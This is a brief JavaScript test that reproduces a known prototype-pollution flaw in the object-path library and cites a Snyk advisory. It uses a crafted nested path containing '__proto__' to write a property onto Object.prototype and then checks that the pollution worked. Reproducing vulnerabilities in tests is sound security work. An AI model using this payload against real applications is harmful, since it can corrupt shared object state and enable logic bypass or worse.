//https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453
test("prototype pollution in object-path", () => {
  const objectPath = require("object-path");

  expect({}.polluted).toBe(undefined);
  objectPath.withInheritedProps.set({}, [["__proto__"], "polluted"], "yes");
  expect({}.polluted).toBe("yes");
});
